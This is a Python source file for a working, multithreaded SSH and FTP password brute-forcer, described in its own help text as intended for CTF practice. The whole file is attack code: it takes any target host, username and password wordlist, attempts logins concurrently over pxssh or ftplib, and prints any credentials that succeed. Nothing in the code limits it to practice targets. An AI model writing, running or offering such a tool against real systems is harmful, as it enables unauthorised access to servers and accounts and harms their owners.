
import argparse
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
from pexpect import pxssh
from ftplib import FTP, error_perm
from tqdm import tqdm
import os


def ssh_brute(host: str, user: str, password: str, timeout: int = 8) -> bool:
    """Try SSH login with pxssh."""
    try:
        s = pxssh.pxssh(timeout=timeout)
        s.login(host, user, password, auto_prompt_reset=False)
        print("\n" + "="*70)
        print(f"[+] SUCCESS! SSH Login found!")
        print(f"Host:     {host}")
        print(f"Username: {user}")
        print(f"Password: {password}")
        print("="*70)
        return True
    except pxssh.ExceptionPxssh as e:
        if "password refused" in str(e).lower() or "authentication failed" in str(e).lower():
            return False
        # Other errors (timeout, connection issues) - just continue
        return False
    except Exception:
        return False


def ftp_brute(host: str, user: str, password: str, timeout: int = 8) -> bool:
    """Try FTP login."""
    try:
        ftp = FTP(timeout=timeout)
        ftp.connect(host)
        ftp.login(user, password)
        print("\n" + "="*70)
        print(f"[+] SUCCESS! FTP Login found!")
        print(f"Host:     {host}")
        print(f"Username: {user}")
        print(f"Password: {password}")
        print("="*70)
        ftp.quit()
        return True
    except error_perm:
        return False
    except Exception:
        return False


def main():
    parser = argparse.ArgumentParser(description="Simple SSH/FTP brute-forcer for CTF practice")
    parser.add_argument("mode", choices=["ssh", "ftp"], help="Attack mode: ssh or ftp")
    parser.add_argument("host", help="Target host IP or hostname")
    parser.add_argument("username", help="Username to brute-force")
    parser.add_argument("wordlist", help="Path to password wordlist")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of concurrent threads (default: 10)")
    parser.add_argument("-T", "--timeout", type=int, default=8, help="Connection timeout in seconds (default: 8)")
    parser.add_argument("--delay", type=float, default=0.1, help="Delay between starting threads (default: 0.1s)")

    args = parser.parse_args()

    if not os.path.isfile(args.wordlist):
        print(f"[-] Wordlist not found: {args.wordlist}")
        sys.exit(1)

    print(f"[*] Starting {args.mode.upper()} brute-force")
    print(f"[*] Target: {args.host} | User: {args.username} | Threads: {args.threads}")
    print(f"[*] Wordlist: {args.wordlist}\n")

    found = False
    passwords = []

    with open(args.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
        passwords = [line.strip() for line in f if line.strip()]

    if not passwords:
        print("[-] Wordlist is empty!")
        sys.exit(1)

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_to_pass = {
            executor.submit(
                ssh_brute if args.mode == "ssh" else ftp_brute,
                args.host, args.username, pwd, args.timeout
            ): pwd for pwd in passwords
        }

        for future in tqdm(as_completed(future_to_pass), total=len(passwords), desc="Testing passwords"):
            pwd = future_to_pass[future]
            try:
                success = future.result()
                if success:
                    found = True
                    # Optionally stop all threads, but for simplicity we let it finish
                    break
            except Exception:
                pass
            time.sleep(args.delay)  # Small delay to not overwhelm the target

    if not found:
        print("\n[-] No valid credentials found.")
    else:
        print("\n[+] Brute-force completed successfully!")

    print("\nPress Enter to exit...")
    input()


if __name__ == "__main__":
    main()